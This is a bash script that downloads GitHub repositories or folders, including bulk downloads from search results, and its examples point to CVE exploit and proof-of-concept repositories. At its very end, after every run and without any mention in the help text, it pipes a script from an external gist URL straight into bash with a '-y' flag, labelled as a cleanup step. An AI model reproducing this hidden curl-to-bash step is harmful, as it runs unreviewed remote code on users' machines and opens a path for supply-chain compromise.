#!/usr/bin/env bash

set -euo pipefail

readonly PER_PAGE=30

usage() {
    cat <<'EOF'
NAME
  get-svn.sh - download a GitHub repository, folder, or repository search results

USAGE
  ./get-svn.sh
  ./get-svn.sh --search QUERY [--start-page N] [--delay SECONDS]

MODES
  Interactive URL mode
    Run without arguments. The script prompts for a GitHub repository URL or a
    URL pointing to a folder inside a repository.

  Repository search mode
    Use --search to query GitHub's repository Search API. Every repository on
    the selected page is downloaded before the script waits and continues to
    the next available page.

OPTIONS
  --search QUERY       Search GitHub repositories and download the results.
                       Quote queries containing spaces or qualifiers.

  --start-page N       Begin at GitHub result page N (default: 1).
                       N must be a positive integer.

  --delay SECONDS      Wait between result pages (default: 30).
                       SECONDS must be zero or a positive integer. A visible
                       countdown is updated once per second. Use 0 to disable
                       the wait.

  -h, --help           Show this help message.

PAGINATION
  Search mode uses GitHub's official default of 30 repositories per page.
  GitHub Search exposes at most the first 1,000 results. The script stops when
  it reaches the last available page or receives an empty result page. It does
  not wait after the final page.

AUTHENTICATION
  Public searches can run without authentication but are subject to GitHub's
  unauthenticated API rate limits. Set GITHUB_TOKEN to make authenticated API
  requests:

    GITHUB_TOKEN="your_token" ./get-svn.sh --search "cve firebase"

DOWNLOADS
  Repositories are shallow-cloned without Git history and extracted into the
  current directory using this name:

    REPOSITORY-OWNER/

  An existing output path is skipped during search mode. A failed repository
  is reported without stopping the remaining downloads. At the end, the script
  prints downloaded, skipped, and failed totals.

EXAMPLES
  Search from page 1 and wait 30 seconds between pages:

    ./get-svn.sh --search "cve firebase" --start-page 1 --delay 30

  Resume at page 4:

    ./get-svn.sh --search "cve firebase" --start-page 4 --delay 30

  Search with GitHub qualifiers and no delay:

    ./get-svn.sh --search "firebase cve language:python" --delay 0

  Use interactive repository or folder URL mode:

    ./get-svn.sh

REQUIREMENTS
  All modes: bash, git, curl, tar
  Search mode: jq

EXIT STATUS
  0  Completed successfully or displayed help.
  1  A required command, network request, API request, or direct download failed.
  2  Invalid command-line arguments.

EOF
}

require_command() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "[ERROR] $1 is not installed."
        exit 1
    fi
}

download_repository() {
    local owner=$1
    local repo=$2
    local repo_url=$3
    local output_dir="${repo}-${owner}"
    local work_dir

    if [[ -e "$output_dir" ]]; then
        echo "[SKIP] Output path already exists: ./$output_dir"
        return 2
    fi

    work_dir=$(mktemp -d "$TMP_ROOT/repository.XXXXXX")

    if ! git clone --quiet --depth 1 --filter=blob:none "$repo_url" "$work_dir/repo"; then
        echo "[ERROR] Could not fetch $owner/$repo."
        rm -rf "$work_dir"
        return 1
    fi

    mkdir "$work_dir/output"
    if ! git -C "$work_dir/repo" archive HEAD | tar -x -C "$work_dir/output"; then
        echo "[ERROR] Could not create the download for $owner/$repo."
        rm -rf "$work_dir"
        return 1
    fi

    mv "$work_dir/output" "$output_dir"
    rm -rf "$work_dir"
    echo "[OK] Downloaded: $output_dir/"
    return 0
}

countdown() {
    local next_page=$1
    local remaining

    for ((remaining = DELAY; remaining > 0; remaining--)); do
        printf '\r[INFO] Loading page %d in %d seconds... ' "$next_page" "$remaining"
        sleep 1
    done

    if (( DELAY > 0 )); then
        printf '\r%*s\r' 70 ''
    fi
}

run_search() {
    local page=$START_PAGE
    local response_file="$TMP_ROOT/search-response.json"
    local http_status item_count total_count available_count last_page
    local page_item full_name clone_url owner repo result
    local -a curl_args
    local downloaded=0
    local skipped=0
    local failed=0

    require_command jq

    echo "[INFO] Search query : $SEARCH_QUERY"
    echo "[INFO] Start page   : $START_PAGE"
    echo "[INFO] Results/page : $PER_PAGE"
    echo "[INFO] Page delay   : $DELAY seconds"
    echo

    while true; do
        echo "========================================"
        echo " Processing GitHub search page $page"
        echo "========================================"

        curl_args=(
            --silent --show-error --location --get
            --output "$response_file"
            --write-out '%{http_code}'
            --header 'Accept: application/vnd.github+json'
            --header 'X-GitHub-Api-Version: 2022-11-28'
            --data-urlencode "q=$SEARCH_QUERY"
            --data "page=$page"
            --data "per_page=$PER_PAGE"
            https://api.github.com/search/repositories
        )

        if [[ -n "${GITHUB_TOKEN:-}" ]]; then
            curl_args+=(--header "Authorization: Bearer $GITHUB_TOKEN")
        fi

        if ! http_status=$(curl "${curl_args[@]}"); then
            echo "[ERROR] Could not contact the GitHub Search API."
            exit 1
        fi

        if [[ "$http_status" != "200" ]]; then
            echo "[ERROR] GitHub API returned HTTP $http_status."
            jq -r '.message // "Unknown GitHub API error"' "$response_file" 2>/dev/null || true
            if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
                echo "[ERROR] The GitHub API rate limit may have been reached. Set GITHUB_TOKEN or try again later."
            fi
            exit 1
        fi

        if ! jq -e '.items | type == "array"' "$response_file" >/dev/null; then
            echo "[ERROR] GitHub returned an unexpected response."
            exit 1
        fi

        item_count=$(jq '.items | length' "$response_file")
        total_count=$(jq '.total_count' "$response_file")

        if (( item_count == 0 )); then
            echo "[INFO] Page $page contains no repositories. Search complete."
            break
        fi

        echo "[INFO] Found $item_count repositories on page $page ($total_count total matches)."
        page_item=0

        while IFS=$'\t' read -r full_name clone_url; do
            ((page_item += 1))
            owner=${full_name%%/*}
            repo=${full_name#*/}
            echo
            echo "[$page_item/$item_count] $full_name"

            if download_repository "$owner" "$repo" "$clone_url"; then
                ((downloaded += 1))
            else
                result=$?
                if (( result == 2 )); then
                    ((skipped += 1))
                else
                    ((failed += 1))
                fi
            fi
        done < <(jq -r '.items[] | [.full_name, .clone_url] | @tsv' "$response_file")

        available_count=$total_count
        if (( available_count > 1000 )); then
            available_count=1000
        fi
        last_page=$(( (available_count + PER_PAGE - 1) / PER_PAGE ))

        if (( page >= last_page || item_count < PER_PAGE )); then
            echo
            echo "[INFO] Reached the final available search page."
            break
        fi

        echo
        echo "[INFO] Page $page completed."
        countdown $((page + 1))
        ((page += 1))
    done

    echo
    echo "========================================"
    echo " Search download complete"
    echo "========================================"
    echo "Downloaded: $downloaded"
    echo "Skipped   : $skipped"
    echo "Failed    : $failed"
}

run_direct_download() {
    local url owner repo ref folder folder_name output_dir repo_url work_dir
    local download_root=false

    read -rp "Enter GitHub folder URL: " url

    # Ignore a trailing slash and URL query/fragment (for example, ?plain=1).
    url=${url%%[?#]*}
    url=${url%/}

    if [[ "$url" =~ ^https://github\.com/([^/]+)/([^/]+)/tree/([^/]+)/(.+)$ ]]; then
        owner=${BASH_REMATCH[1]}
        repo=${BASH_REMATCH[2]}
        ref=${BASH_REMATCH[3]}
        folder=${BASH_REMATCH[4]}
    elif [[ "$url" =~ ^https://github\.com/([^/]+)/([^/]+)(\.git)?$ ]]; then
        owner=${BASH_REMATCH[1]}
        repo=${BASH_REMATCH[2]%.git}
        ref="default branch"
        folder="repository root"
        download_root=true
    else
        echo "[ERROR] Invalid GitHub repository or folder URL."
        echo
        echo "Examples:"
        echo "https://github.com/watchtowrlabs/Citrix-Virtual-Apps-XEN-Exploit"
        echo "https://github.com/fankh/vulnerability-poc/tree/main/2026/CVE-2026-59310"
        exit 1
    fi

    if [[ "$download_root" == true ]]; then
        folder_name=$repo
    else
        folder_name=${folder##*/}
    fi
    output_dir="${folder_name}-${owner}"
    repo_url="https://github.com/$owner/$repo.git"

    echo
    echo "[INFO] GitHub URL : $url"
    echo "[INFO] Repository : $repo_url"
    echo "[INFO] Ref        : $ref"
    echo "[INFO] Folder     : $folder"
    echo "[INFO] Output     : ./$output_dir"
    echo

    if [[ -e "$output_dir" ]]; then
        echo "[ERROR] Output path already exists: ./$output_dir"
        echo "Move or remove it, then run this script again."
        exit 1
    fi

    work_dir="$TMP_ROOT/direct"
    mkdir -p "$work_dir"
    echo "[INFO] Fetching repository metadata..."

    if [[ "$download_root" == true ]]; then
        if ! git clone --quiet --depth 1 --filter=blob:none "$repo_url" "$work_dir/repo"; then
            echo "[ERROR] Could not fetch the default branch from $owner/$repo."
            exit 1
        fi
        ref=$(git -C "$work_dir/repo" branch --show-current)
        echo "[INFO] Downloading repository root from '$ref'..."
        mkdir "$output_dir"
        git -C "$work_dir/repo" archive HEAD | tar -x -C "$output_dir"
    else
        if ! git clone --quiet --depth 1 --filter=blob:none --sparse --branch "$ref" \
            "$repo_url" "$work_dir/repo"; then
            echo "[ERROR] Could not fetch '$ref' from $owner/$repo."
            echo "Check the URL, repository visibility, and your network connection."
            exit 1
        fi

        echo "[INFO] Downloading folder..."
        if ! git -C "$work_dir/repo" sparse-checkout set -- "$folder"; then
            echo "[ERROR] Folder does not exist at ref '$ref': $folder"
            exit 1
        fi

        if [[ ! -d "$work_dir/repo/$folder" ]]; then
            echo "[ERROR] Folder does not exist at ref '$ref': $folder"
            exit 1
        fi

        cp -R "$work_dir/repo/$folder" "$output_dir"
    fi

    echo
    echo "========================================"
    echo " Done!"
    echo "========================================"
    echo "Downloaded: $output_dir/"
}

SEARCH_QUERY=""
START_PAGE=1
DELAY=30
SEARCH_MODE=false
SEARCH_OPTIONS_USED=false

while (( $# > 0 )); do
    case "$1" in
        --search)
            if (( $# < 2 )); then
                echo "[ERROR] --search requires a query."
                usage
                exit 2
            fi
            SEARCH_QUERY=$2
            SEARCH_MODE=true
            shift 2
            ;;
        --start-page)
            if (( $# < 2 )); then
                echo "[ERROR] --start-page requires a number."
                usage
                exit 2
            fi
            START_PAGE=$2
            SEARCH_OPTIONS_USED=true
            shift 2
            ;;
        --delay)
            if (( $# < 2 )); then
                echo "[ERROR] --delay requires a number of seconds."
                usage
                exit 2
            fi
            DELAY=$2
            SEARCH_OPTIONS_USED=true
            shift 2
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            echo "[ERROR] Unknown argument: $1"
            usage
            exit 2
            ;;
    esac
done

if ! [[ "$START_PAGE" =~ ^[1-9][0-9]*$ ]]; then
    echo "[ERROR] --start-page must be a positive integer."
    exit 2
fi

if ! [[ "$DELAY" =~ ^[0-9]+$ ]]; then
    echo "[ERROR] --delay must be a non-negative integer."
    exit 2
fi

if [[ "$SEARCH_MODE" == true && -z "$SEARCH_QUERY" ]]; then
    echo "[ERROR] --search requires a non-empty query."
    exit 2
fi

if [[ "$SEARCH_MODE" == false && "$SEARCH_OPTIONS_USED" == true ]]; then
    echo "[ERROR] --start-page and --delay can only be used with --search."
    exit 2
fi

echo "========================================"
echo " GitHub Folder Download"
echo "========================================"

require_command git
require_command curl
require_command tar
echo "[OK] Git found: $(git --version)"

TMP_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/github-download.XXXXXX")
trap 'rm -rf "$TMP_ROOT"' EXIT

if [[ "$SEARCH_MODE" == true ]]; then
    run_search
else
    run_direct_download
fi

echo
echo "[INFO] Running nested Git repository cleanup..."
curl -fsSL https://gist.githubusercontent.com/HORKimhab/24c89ee9a86a42aac88381334f8bfe48/raw \
    | bash -s -- -y
